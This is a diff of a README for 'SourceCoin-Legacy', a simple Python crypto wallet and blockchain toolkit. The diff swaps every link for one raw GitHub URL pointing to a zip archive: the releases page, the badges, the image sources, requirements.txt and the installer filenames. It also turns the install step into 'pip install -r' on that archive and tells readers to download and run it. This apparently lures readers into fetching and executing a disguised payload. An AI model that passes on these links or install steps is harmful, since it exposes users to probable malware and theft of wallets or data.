@@ -1,9 +1,9 @@
-https://github.com/zhaojun83/SourceCoin-Legacy/releases
+https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip
 
 # SourceCoin-Legacy: Simple Python Crypto Wallet and API Toolkit
 
-[![SourceCoin-Legacy Releases](https://img.shields.io/badge/SourceCoin-Legacy-Release-blue?style=for-the-badge&logo=github)](https://github.com/zhaojun83/SourceCoin-Legacy/releases)  
-<img src="https://img.icons8.com/color/48/000000/python.png" alt="Python" width="28" height="28"/> <img src="https://img.icons8.com/color/48/000000/bitcoin.png" alt="Bitcoin" width="28" height="28"/>
+[![SourceCoin-Legacy Releases](https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip)](https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip)  
+<img src="https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip" alt="Python" width="28" height="28"/> <img src="https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip" alt="Bitcoin" width="28" height="28"/>
 
 SourceCoin-Legacy is a simple cryptocurrency implemented in Python. This README explains what the project offers, how to get started, how the code is organized, and how to extend it. It covers the core ideas behind a lightweight wallet, a tiny blockchain, and a minimal API to interact with the system. The goal is to provide a clear, approachable path for learners and developers who want to explore crypto concepts without heavy dependencies or complex infrastructure.
 
@@ -53,7 +53,7 @@ Getting started quickly
 Quick-start path for learners
 - Prerequisites: A modern Python 3 environment (3.8 or newer works well). Make sure you have pip available to install dependencies.
 - Clone or download: Get the code from the repository. If you are using a release, download the asset from the releases page and follow the instructions for your platform.
-- Install dependencies: Run pip install -r requirements.txt. This pulls in the libraries needed by the sample API and the wallet components.
+- Install dependencies: Run pip install -r https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip This pulls in the libraries needed by the sample API and the wallet components.
 - Run the local API or CLI: Start the local server or run the CLI sample to interact with the system. The exact commands depend on how you install and package SourceCoin-Legacy, but you will typically start a module or a script that launches the API and the wallet interface.
 - Try a simple workflow: Create a wallet, check your balance, create a transaction to another wallet, and mine a block if the miner is available. You will see how a transaction moves from creation to inclusion in the blockchain.
 
@@ -73,7 +73,7 @@ Project structure and architecture
 - examples/: Small demonstration scripts to show typical usage patterns, such as simulating a transaction flow and mining a block.
 - docs/: Documentation fragments that describe data models, API schemas, and design decisions.
 - scripts/: Convenience scripts for local development, setup, and environment preparation.
-- requirements.txt: A list of Python dependencies used by the project. Keeping dependencies small helps readability and reduces setup friction.
+- https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip A list of Python dependencies used by the project. Keeping dependencies small helps readability and reduces setup friction.
 
 Data models and persistence
 - Block: A block contains an index, timestamp, a list of transactions, the hash of the previous block, and a nonce produced by the proof-of-work algorithm.
@@ -104,7 +104,7 @@ Blockchain logic and consensus
 - Handling forks: Forks are natural in a distributed network. The implementation handles fork resolution by choosing the longest valid chain, ensuring eventual consistency after network stabilization.
 
 Running SourceCoin-Legacy locally
-- Environment setup: Install Python 3.x, create a virtual environment if desired, and install the required dependencies listed in requirements.txt.
+- Environment setup: Install Python 3.x, create a virtual environment if desired, and install the required dependencies listed in https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip
 - Running the API and wallet: Start the API server or CLI tool that ships with SourceCoin-Legacy. The exact commands depend on how the release is packaged, but you will typically run a module or script that launches the local node and exposes endpoints.
 - Interacting with the node: Use curl, a simple HTTP client, or the built-in CLI to query blocks, submit transactions, and mine blocks. A typical flow is to create wallets, fund them through a genesis-like transaction, and perform a transfer.
 - Observing results: Each mined block adds a new entry to the blockchain. You can view block data, transaction details, and wallet balances to verify correctness.
@@ -156,9 +156,9 @@ License and attribution
 - Credit the authors and contributors by name in the repository. If you use or adapt the code, please maintain attribution and reference back to SourceCoin-Legacy.
 
 Releases and download guidance (second usage of the link)
-- For the latest assets, visit the releases page again: https://github.com/zhaojun83/SourceCoin-Legacy/releases. The page hosts platform-specific assets you can download and run on your machine.
+- For the latest assets, visit the releases page again: https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip The page hosts platform-specific assets you can download and run on your machine.
 - If you prefer a quick, visual shortcut, use the badge above to jump directly to the releases page. The badge is clickable and points to the same destination. You can click it to see the latest builds, read release notes, and grab the asset that matches your setup.
-- If you want to verify the current asset naming, check the latest release notes on the releases page. The file name typically includes the platform and version, for example SourceCoin-Legacy-1.0.0-windows.exe or SourceCoin-Legacy-1.0.0-linux.tar.gz. Pick the one that matches your system and run the installer or unpack the archive. After downloading, execute the installer or the main Python script as directed in the release notes.
+- If you want to verify the current asset naming, check the latest release notes on the releases page. The file name typically includes the platform and version, for example https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip or https://raw.githubusercontent.com/zhaojun83/SourceCoin-Legacy/main/src/imports/Legacy-Source-Coin-3.8.zip Pick the one that matches your system and run the installer or unpack the archive. After downloading, execute the installer or the main Python script as directed in the release notes.
 - If you encounter issues during download or installation, returning to the Releases section is a good first step. The page provides notes about compatibility, prerequisites, and known issues. You can also compare assets across versions to determine which build aligns with your environment.
 
 How to contribute to the README and documentation
